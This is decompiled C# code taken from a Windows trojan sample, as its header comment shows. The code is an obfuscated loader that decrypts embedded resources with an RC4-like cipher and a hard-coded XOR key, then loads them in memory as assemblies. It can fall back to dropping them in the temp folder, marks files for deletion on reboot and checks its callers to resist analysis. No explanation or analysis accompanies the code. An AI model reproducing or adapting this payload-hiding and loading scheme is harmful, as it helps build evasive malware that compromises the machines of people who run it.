// Decompiled with JetBrains decompiler
// Type:  
// Assembly: Jbkttgjy, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 2E2A819A-CCD1-40A6-A838-713DABA6E2A0
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\UDS-Trojan.Multi.GenericML.xnet-ba0fec15d6c5e15df9fd3ac351711716a58c081b27b0f60fa90a77affd84a123.exe

using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

internal static class \u0005\u2006
{
  [MethodImpl(MethodImplOptions.NoInlining)]
  private static bool \u0002() => \u0005\u2006.\u0003();

  [MethodImpl(MethodImplOptions.NoInlining)]
  private static bool \u0003()
  {
    StackTrace stackTrace1 = new StackTrace();
    if (true)
      goto label_3;
label_1:
    StackTrace stackTrace2;
    StackFrame frame = stackTrace2.GetFrame(3);
    if (true)
      goto label_4;
label_2:
    StackFrame stackFrame;
    MethodBase methodBase1 = stackFrame == null ? (MethodBase) null : stackFrame.GetMethod();
    if (true)
      goto label_6;
label_5:
    MethodBase methodBase2;
    Type type = (object) methodBase2 == null ? (Type) null : methodBase2.DeclaringType;
    return (object) type != (object) typeof (RuntimeMethodHandle) && (object) type != null && (object) type.Assembly == (object) typeof (\u0005\u2006).Assembly;
label_6:
    methodBase2 = methodBase1;
    goto label_5;
label_4:
    stackFrame = frame;
    goto label_2;
label_3:
    stackTrace2 = stackTrace1;
    goto label_1;
  }

  internal static void \u0002() => AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(\u0005\u2006.\u0002);

  internal static Assembly \u0002(string _param0)
  {
    Assembly assembly1 = \u0005\u2006.\u0003(_param0);
    if (true)
      goto label_2;
label_1:
    Assembly assembly2;
    return assembly2;
label_2:
    assembly2 = assembly1;
    goto label_1;
  }

  private static Assembly \u0002(object _param0, ResolveEventArgs _param1)
  {
    Assembly assembly1 = \u0005\u2006.\u0003(_param1.Name);
    if (true)
      goto label_2;
label_1:
    Assembly assembly2;
    return assembly2;
label_2:
    assembly2 = assembly1;
    goto label_1;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  private static Assembly \u0003(string _param0)
  {
    \u0005\u2006.\u0002 obj1 = new \u0005\u2006.\u0002(_param0.ToUpperInvariant());
    if (true)
      goto label_3;
label_1:
    if (true)
      goto label_4;
label_2:
    \u0005\u2006.\u0008.\u0002 obj2;
    bool flag1;
    if (obj2 == null && !flag1)
    {
      string str = obj1.\u0002(false);
      if (true)
        goto label_7;
label_6:
      string s;
      using (IEnumerator<\u0005\u2006.\u0008.\u0002> enumerator = \u0005\u2006.\u0008.\u0002(Convert.ToBase64String(Encoding.UTF8.GetBytes(s))).GetEnumerator())
      {
        if (enumerator.MoveNext())
        {
          obj2 = enumerator.Current;
          goto label_13;
        }
        else
          goto label_13;
      }
label_7:
      s = str;
      goto label_6;
    }
label_13:
    if (obj2 == null)
      return (Assembly) null;
    Dictionary<string, Assembly> dictionary = \u0005\u2006.\u0003.\u0002;
    Assembly assembly;
    lock (dictionary)
    {
      if (!dictionary.TryGetValue(obj2.\u0005, out assembly))
      {
        byte[] rawAssembly = \u0005\u2006.\u0008.\u0002(obj2);
        if (rawAssembly == null)
          return (Assembly) null;
        bool flag2 = obj2.\u000E;
        if (!flag2)
        {
          try
          {
            assembly = Assembly.Load(rawAssembly);
          }
          catch (FileLoadException ex)
          {
            flag2 = true;
          }
          catch (BadImageFormatException ex)
          {
            flag2 = true;
          }
        }
        if (flag2)
        {
          try
          {
            assembly = Assembly.LoadFrom(\u0005\u2006.\u0008.\u0002(obj2, true, rawAssembly));
          }
          catch
          {
          }
        }
        dictionary.Add(obj2.\u0005, assembly);
      }
    }
    return assembly;
label_4:
    flag1 = false;
    goto label_2;
label_3:
    obj2 = (\u0005\u2006.\u0008.\u0002) null;
    goto label_1;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  private static byte[] \u0002(byte[] _param0)
  {
    string str = \u0008\u2006.\u0002(2093215815);
    if (true)
      goto label_4;
label_1:
    string s;
    byte[] numArray1 = Convert.FromBase64String(s);
    if (true)
      goto label_5;
label_2:
    byte[] numArray2;
    byte[] numArray3 = numArray2;
    if (true)
      goto label_6;
label_3:
    \u0005\u2006.\u0005 obj = new \u0005\u2006.\u0005(numArray2);
    int length = _param0.Length;
    byte num1 = 0;
    byte num2 = 121;
    byte[] numArray4 = new byte[8]
    {
      (byte) 148,
      (byte) 68,
      (byte) 208,
      (byte) 52,
      (byte) 241,
      (byte) 93,
      (byte) 195,
      (byte) 220
    };
    for (int index = 0; index != length; ++index)
    {
      if (num1 == (byte) 0)
        num2 = obj.\u0002();
      ++num1;
      if (num1 == (byte) 32)
        num1 = (byte) 0;
      _param0[index] ^= (byte) ((uint) num2 ^ (uint) numArray4[index >> 2 & 3] ^ (uint) numArray4[(int) num1 & 3]);
    }
    return _param0;
label_6:
    \u000E\u2006.\u0002(numArray3);
    goto label_3;
label_5:
    numArray2 = numArray1;
    goto label_2;
label_4:
    s = str;
    goto label_1;
  }

  [DllImport("kernel32.dll", EntryPoint = "MoveFileEx")]
  private static extern bool \u0002(string _param0, string _param1, int _param2);

  private struct \u0002
  {
    public Version \u0002;
    public bool \u0003;
    public string \u0005;
    public string \u0008;
    public bool \u0006;
    public string \u000E;
    public bool \u000F;

    public \u0002(string _param1)
      : this()
    {
      Version version = new Version();
      if (true)
        goto label_4;
label_1:
      string empty = string.Empty;
      if (true)
        goto label_5;
label_2:
      string[] strArray1 = _param1.Split(',');
      if (true)
        goto label_6;
label_3:
      string[] strArray2;
      for (int index = 0; index < strArray2.Length; ++index)
      {
        string str = strArray2[index].Trim();
        if (str.StartsWith(\u0008\u2006.\u0002(2093219347), StringComparison.OrdinalIgnoreCase))
        {
          this.\u0002 = new Version(str.Substring(\u0008\u2006.\u0002(2093219347).Length));
          this.\u0003 = true;
        }
        else if (str.StartsWith(\u0008\u2006.\u0002(2093219810), StringComparison.OrdinalIgnoreCase))
        {
          this.\u0008 = str.Substring(\u0008\u2006.\u0002(2093219810).Length);
          if (this.\u0008.Equals(\u0008\u2006.\u0002(2093219825), StringComparison.OrdinalIgnoreCase))
            this.\u0008 = (string) null;
          this.\u0006 = true;
        }
        else if (str.StartsWith(\u0008\u2006.\u0002(2093219783), StringComparison.OrdinalIgnoreCase))
        {
          this.\u000E = str.Substring(\u0008\u2006.\u0002(2093219783).Length);
          if (this.\u000E.Equals(\u0008\u2006.\u0002(2093219805), StringComparison.OrdinalIgnoreCase))
            this.\u000E = (string) null;
          this.\u000F = true;
        }
        else
          this.\u0005 = str;
      }
      return;
label_6:
      strArray2 = strArray1;
      goto label_3;
label_5:
      this.\u0005 = empty;
      goto label_2;
label_4:
      this.\u0002 = version;
      goto label_1;
    }

    public string \u0002(bool _param1)
    {
      StringBuilder stringBuilder1 = new StringBuilder();
      if (true)
        goto label_2;
label_1:
      StringBuilder stringBuilder2;
      stringBuilder2.Append(this.\u0005);
      if (_param1)
        stringBuilder2.Append(\u0008\u2006.\u0002(2093219744)).Append((object) this.\u0002);
      stringBuilder2.Append(\u0008\u2006.\u0002(2093219761)).Append(this.\u0008 ?? \u0008\u2006.\u0002(2093219714)).Append(\u0008\u2006.\u0002(2093219728)).Append(this.\u000E ?? \u0008\u2006.\u0002(2093219688));
      return stringBuilder2.ToString();
label_2:
      stringBuilder2 = stringBuilder1;
      goto label_1;
    }
  }

  private static class \u0003
  {
    internal static readonly Dictionary<string, Assembly> \u0002;

    static \u0003()
    {
      Dictionary<string, Assembly> dictionary = new Dictionary<string, Assembly>((IEqualityComparer<string>) StringComparer.Ordinal);
      if (false)
        return;
      \u0005\u2006.\u0003.\u0002 = dictionary;
    }
  }

  private sealed class \u0005
  {
    private byte[] \u0002;
    private int \u0003;
    private int \u0005;

    public \u0005(byte[] _param1)
    {
      byte[] numArray = new byte[256];
      if (true)
        goto label_4;
label_1:
      // ISSUE: explicit constructor call
      base.\u002Ector();
      int length = _param1.Length;
      if (true)
        goto label_5;
label_2:
      if (true)
        this.\u0003 = 0;
      for (; this.\u0003 < 256; ++this.\u0003)
        this.\u0002[this.\u0003] = (byte) this.\u0003;
      int num;
      for (this.\u0003 = this.\u0005 = 0; this.\u0003 < 256; ++this.\u0003)
      {
        this.\u0005 = this.\u0005 + (int) _param1[this.\u0003 % num] + (int) this.\u0002[this.\u0003] & (int) byte.MaxValue;
        this.\u0002(this.\u0003, this.\u0005);
      }
      return;
label_5:
      num = length;
      goto label_2;
label_4:
      this.\u0002 = numArray;
      goto label_1;
    }

    private void \u0002(int _param1, int _param2)
    {
      int num1 = (int) this.\u0002[_param1];
      if (true)
        goto label_2;
label_1:
      this.\u0002[_param1] = this.\u0002[_param2];
      byte num2;
      this.\u0002[_param2] = num2;
      return;
label_2:
      num2 = (byte) num1;
      goto label_1;
    }

    public byte \u0002()
    {
      int num1 = this.\u0003 + 1 & (int) byte.MaxValue;
      if (true)
        goto label_4;
label_1:
      int num2 = this.\u0005 + (int) this.\u0002[this.\u0003] & (int) byte.MaxValue;
      if (true)
        goto label_5;
label_2:
      int num3 = this.\u0003;
      int num4 = this.\u0005;
      if (true)
        goto label_6;
label_3:
      return this.\u0002[(int) (byte) ((uint) this.\u0002[this.\u0003] + (uint) this.\u0002[this.\u0005])];
label_6:
      this.\u0002(num3, num4);
      goto label_3;
label_5:
      this.\u0005 = num2;
      goto label_2;
label_4:
      this.\u0003 = num1;
      goto label_1;
    }
  }

  private static class \u0008
  {
    [MethodImpl(MethodImplOptions.NoInlining)]
    internal static IEnumerable<\u0005\u2006.\u0008.\u0002> \u0002(
      string _param0)
    {
      \u0005\u2006.\u0008.\u0005 obj = new \u0005\u2006.\u0008.\u0005(-2);
      string str = _param0;
      if (false)
        return (IEnumerable<\u0005\u2006.\u0008.\u0002>) obj;
      obj.\u0006 = str;
      return (IEnumerable<\u0005\u2006.\u0008.\u0002>) obj;
    }

    internal static byte[] \u0002(\u0005\u2006.\u0008.\u0002 _param0)
    {
      Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(_param0.\u0005);
      if (true)
        goto label_2;
label_1:
      Stream stream;
      if (stream == null)
        return (byte[]) null;
      int length = (int) stream.Length;
      if (true)
        goto label_7;
label_5:
      int count;
      byte[] numArray = new byte[count];
      if (true)
        goto label_8;
label_6:
      byte[] buffer;
      stream.Read(buffer, 0, count);
      stream.Dispose();
      if (_param0.\u0008)
        buffer = \u0005\u2006.\u0002(buffer);
      return buffer;
label_8:
      buffer = numArray;
      goto label_6;
label_7:
      count = length;
      goto label_5;
label_2:
      stream = manifestResourceStream;
      goto label_1;
    }

    internal static string \u0002(\u0005\u2006.\u0008.\u0002 _param0, bool _param1, byte[] _param2)
    {
      string str1 = Path.Combine(Path.GetTempPath(), _param0.\u0005);
      string str2;
      if (true)
        str2 = str1;
      try
      {
        Directory.CreateDirectory(str2);
      }
      catch
      {
        string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        if (true)
          goto label_6;
label_4:
        string str3 = Path.Combine(str2, \u0008\u2006.\u0002(2093215854));
        if (true)
          goto label_7;
label_5:
        str2 = Path.Combine(str2, _param0.\u0005);
        Directory.CreateDirectory(str2);
        if (str2 == null)
          throw;
        else
          goto label_9;
label_7:
        str2 = str3;
        goto label_5;
label_6:
        str2 = folderPath;
        goto label_4;
      }
label_9:
      string path = Path.Combine(str2, _param0.\u0003());
      \u0005\u2006.\u0008.\u0003 obj = new \u0005\u2006.\u0008.\u0003(path + \u0008\u2006.\u0002(2093215859));
      obj.\u0002();
      try
      {
        if (!File.Exists(path))
        {
          if (_param2 == null)
            _param2 = \u0005\u2006.\u0008.\u0002(_param0);
          File.WriteAllBytes(path, _param2);
          if (_param1)
          {
            try
            {
              \u0005\u2006.\u0002(path, (string) null, 4);
              \u0005\u2006.\u0002(str2, (string) null, 4);
            }
            catch
            {
            }
          }
        }
      }
      finally
      {
        obj.\u0003();
      }
      return path;
    }

    internal static void \u0002(string _param0, bool _param1)
    {
      bool flag1;
      if (true)
        flag1 = false;
      try
      {
        string path = _param0;
        if (true)
          goto label_5;
label_3:
        if (true)
        {
          flag1 = true;
          goto label_8;
        }
        else
          goto label_8;
label_5:
        File.Delete(path);
        goto label_3;
      }
      catch
      {
      }
label_8:
      string directoryName = Path.GetDirectoryName(_param0);
      bool flag2 = false;
      try
      {
        Directory.Delete(directoryName);
        flag1 = true;
      }
      catch
      {
      }
      if (!_param1)
        return;
      if (!flag1)
      {
        try
        {
          \u0005\u2006.\u0002(_param0, (string) null, 4);
        }
        catch
        {
        }
      }
      if (flag2)
        return;
      try
      {
        \u0005\u2006.\u0002(directoryName, (string) null, 4);
      }
      catch
      {
      }
    }

    internal sealed class \u0002
    {
      public string \u0002;
      private string \u0003;
      public string \u0005;
      public bool \u0008;
      public bool \u0006;
      public bool \u000E;
      public bool \u000F;
      public bool \u0002\u2000;
      public string \u0003\u2000;
      private string \u0005\u2000;

      public \u0002()
      {
        if (true)
          ;
        // ISSUE: explicit constructor call
        base.\u002Ector();
      }

      public string \u0002()
      {
        if (this.\u0003 == null)
        {
          byte[] numArray = Convert.FromBase64String(this.\u0002);
          if (true)
            goto label_3;
label_2:
          byte[] bytes;
          string str = Encoding.UTF8.GetString(bytes, 0, bytes.Length);
          if (true)
          {
            this.\u0003 = str;
            goto label_5;
          }
          else
            goto label_5;
label_3:
          bytes = numArray;
          goto label_2;
        }
label_5:
        return this.\u0003;
      }

      public string \u0003()
      {
        if (this.\u0005\u2000 == null)
        {
          byte[] numArray = Convert.FromBase64String(this.\u0003\u2000);
          if (true)
            goto label_3;
label_2:
          byte[] bytes;
          string str = Encoding.UTF8.GetString(bytes, 0, bytes.Length);
          if (true)
          {
            this.\u0005\u2000 = str;
            goto label_5;
          }
          else
            goto label_5;
label_3:
          bytes = numArray;
          goto label_2;
        }
label_5:
        return this.\u0005\u2000;
      }
    }

    private struct \u0003
    {
      private readonly string \u0002;
      private FileStream \u0003;

      public \u0003(string _param1)
        : this()
      {
        string str = _param1;
        if (false)
          return;
        this.\u0002 = str;
      }

      public bool \u0002()
      {
        bool flag;
        try
        {
          if (this.\u0003 != null)
          {
            if (true)
            {
              flag = false;
              goto label_8;
            }
            else
              goto label_8;
          }
          else
          {
            FileStream fileStream = new FileStream(this.\u0002, FileMode.OpenOrCreate, FileAccess.Write, FileShare.None, 128, FileOptions.DeleteOnClose);
            if (true)
              this.\u0003 = fileStream;
          }
        }
        catch
        {
          if (true)
          {
            flag = false;
            goto label_8;
          }
          else
            goto label_8;
        }
        return true;
label_8:
        return flag;
      }

      public void \u0002()
      {
        if (true)
          goto label_3;
label_1:
        if (true)
          goto label_4;
label_2:
        int val2;
        if (true)
          val2 = 250;
        Stopwatch stopwatch;
        int millisecondsTimeout;
        while (!this.\u0002())
        {
          if (stopwatch == null)
          {
            stopwatch = Stopwatch.StartNew();
          }
          else
          {
            if (stopwatch.Elapsed.TotalSeconds > 300.0)
              throw new TimeoutException(string.Format(\u0008\u2006.\u0002(2093219699), (object) this.\u0002));
            if (millisecondsTimeout < val2)
              millisecondsTimeout = Math.Min(millisecondsTimeout * 2, val2);
          }
          Thread.Sleep(millisecondsTimeout);
        }
        return;
label_4:
        millisecondsTimeout = 25;
        goto label_2;
label_3:
        stopwatch = (Stopwatch) null;
        goto label_1;
      }

      public void \u0003()
      {
        if (this.\u0003 == null)
          return;
        this.\u0003.Dispose();
        if (false)
          return;
        this.\u0003 = (FileStream) null;
      }
    }

    private sealed class \u0005 : 
      IEnumerable<\u0005\u2006.\u0008.\u0002>,
      IEnumerable,
      IEnumerator<\u0005\u2006.\u0008.\u0002>,
      IDisposable,
      IEnumerator
    {
      private int \u0002;
      private \u0005\u2006.\u0008.\u0002 \u0003;
      private int \u0005;
      private string \u0008;
      public string \u0006;
      private string[] \u000E;
      private int \u000F;

      [DebuggerHidden]
      public \u0005(int _param1)
      {
        int num = _param1;
        if (true)
          goto label_3;
label_1:
        int managedThreadId = Thread.CurrentThread.ManagedThreadId;
        if (false)
          return;
        this.\u0005 = managedThreadId;
        return;
label_3:
        this.\u0002 = num;
        goto label_1;
      }

      [DebuggerHidden]
      void IDisposable.\u0005\u2003\u2007​\u0002()
      {
      }

      bool IEnumerator.\u0005\u2003\u2007​\u0002()
      {
        int num1 = this.\u0002;
        if (true)
          goto label_2;
label_1:
        int num2;
        switch (num2)
        {
          case 0:
            if (true)
              goto label_8;
label_5:
            string str1 = \u0008\u2006.\u0002(2093219618);
            if (true)
              goto label_9;
label_6:
            string str2;
            string[] strArray = str2.Split(',');
            if (true)
              goto label_10;
label_7:
            if (this.\u0008 == null && !\u0005\u2006.\u0002())
              return false;
            this.\u000F = 0;
            goto label_19;
label_10:
            this.\u000E = strArray;
            goto label_7;
label_9:
            str2 = str1;
            goto label_6;
label_8:
            this.\u0002 = -1;
            goto label_5;
          case 1:
            this.\u0002 = -1;
            break;
          default:
            return false;
        }
label_18:
        this.\u000F += 4;
label_19:
        if (this.\u000F >= this.\u000E.Length)
          return false;
        string str3 = this.\u000E[this.\u000F];
        if (this.\u0008 == null || str3.Equals(this.\u0008, StringComparison.Ordinal))
        {
          \u0005\u2006.\u0008.\u0002 obj = new \u0005\u2006.\u0008.\u0002();
          obj.\u0002 = str3;
          string str4 = this.\u000E[this.\u000F + 1];
          int length = str4.IndexOf('|');
          if (length >= 0)
          {
            string str5 = str4.Substring(0, length);
            str4 = str4.Substring(length + 1);
            obj.\u0008 = str5.IndexOf('a') != -1;
            obj.\u000E = str5.IndexOf('c') != -1;
          }
          obj.\u0005 = str4;
          obj.\u0003\u2000 = this.\u000E[this.\u000F + 2];
          this.\u0003 = obj;
          this.\u0002 = 1;
          return true;
        }
        goto label_18;
label_2:
        num2 = num1;
        goto label_1;
      }

      [DebuggerHidden]
      \u0005\u2006.\u0008.\u0002 IEnumerator<\u0005\u2006.\u0008.\u0002>.\u0005\u2003\u2007​\u0002()
      {
        if (true)
          ;
        return this.\u0003;
      }

      [DebuggerHidden]
      void IEnumerator.\u0005\u2003\u2007​\u0003() => throw new NotSupportedException();

      [DebuggerHidden]
      object IEnumerator.\u0005\u2003\u2007​\u0002()
      {
        if (true)
          ;
        return (object) this.\u0003;
      }

      [DebuggerHidden]
      IEnumerator<\u0005\u2006.\u0008.\u0002> IEnumerable<\u0005\u2006.\u0008.\u0002>.\u0005\u2003\u2007​\u0002()
      {
        \u0005\u2006.\u0008.\u0005 obj1;
        if (this.\u0002 == -2 && this.\u0005 == Thread.CurrentThread.ManagedThreadId)
        {
          if (true)
            goto label_3;
label_2:
          if (true)
          {
            obj1 = this;
            goto label_7;
          }
          else
            goto label_7;
label_3:
          this.\u0002 = 0;
          goto label_2;
        }
        else
        {
          \u0005\u2006.\u0008.\u0005 obj2 = new \u0005\u2006.\u0008.\u0005(0);
          if (true)
            obj1 = obj2;
        }
label_7:
        obj1.\u0008 = this.\u0006;
        return (IEnumerator<\u0005\u2006.\u0008.\u0002>) obj1;
      }

      [DebuggerHidden]
      IEnumerator IEnumerable.\u0005\u2003\u2007​\u0002()
      {
        if (true)
          ;
        return (IEnumerator) this.\u0005\u2003\u2007​\u0002();
      }
    }
  }
}
